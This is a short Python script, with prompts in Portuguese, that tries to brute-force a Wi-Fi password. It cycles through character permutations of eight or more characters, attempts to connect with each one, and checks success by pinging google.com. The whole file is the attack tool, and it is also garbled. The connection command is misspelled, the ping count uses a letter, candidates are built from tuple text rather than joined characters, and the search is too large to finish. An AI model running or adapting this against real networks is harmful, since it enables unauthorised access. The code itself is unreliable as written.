from subprocess import Popen, STDOUT, PIPE, call
from time import sleep
from itertools import permutations

print("digite o nome da rede: ")
nome = input()

def testar(senha):
    manipulador = Popen('netwish wilan connect {}'.format(nome), shell=False, stdout=PIPE, stderr=STDOUT, stdin=PIPE)
    manipulador.stdin.write(senha)
    while manipulador.poll() == None:
        print(manipulador.stdout.readline().strip())
    if call('ping -n l www.google.com') == 0:
        print('conectado')
        print('esta é a senha: {}'.format(senha))
        exit()
    else:
        print('{} nao é a senha'.format(senha))

caracteres = '01234567890!@#$%¨&*()-_=+abcdefghijklmnopqrstuvxwyzABCDEFGHIJKLMNOPQRSTUVXWYZ'
for x in range(8, len(caracteres)+1):
    for y in permutations(caracteres, x):
        testar(str(y).encode('utf-8'))
        